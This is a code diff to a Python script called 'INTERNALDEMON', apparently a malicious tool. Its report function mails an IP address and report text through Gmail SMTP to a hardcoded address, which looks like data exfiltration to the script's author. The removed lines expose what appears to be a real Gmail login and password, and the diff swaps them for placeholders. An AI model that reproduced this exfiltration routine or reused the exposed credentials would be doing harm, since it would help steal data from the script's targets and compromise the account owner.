@@ -1,3 +1,15 @@
+'''
+
+NAME:    INTERNALDEMON
+AUTHOR:  S1DAL3X
+VERSION: 3.0
+PYTHON:  3.6.1
+
+Please enter your gmail login and password before using script
+(login, password, login again)
+
+'''
+
 import os
 import string
 import shutil
@@ -50,8 +62,8 @@ def report(ip_adress, arg, arg2):
     msgObject = smtplib.SMTP('smtp.gmail.com', 587)
 
     msgObject.starttls()
-    msgObject.login('totorenko2001@gmail.com', 'sap24052001')
-    msgObject.sendmail('123@gmail.com', 'totorenko2001@gmail.com', str(report_text))
+    msgObject.login('-----', '-----')
+    msgObject.sendmail('123@gmail.com', '-----', str(report_text))
     msgObject.quit()
     
 
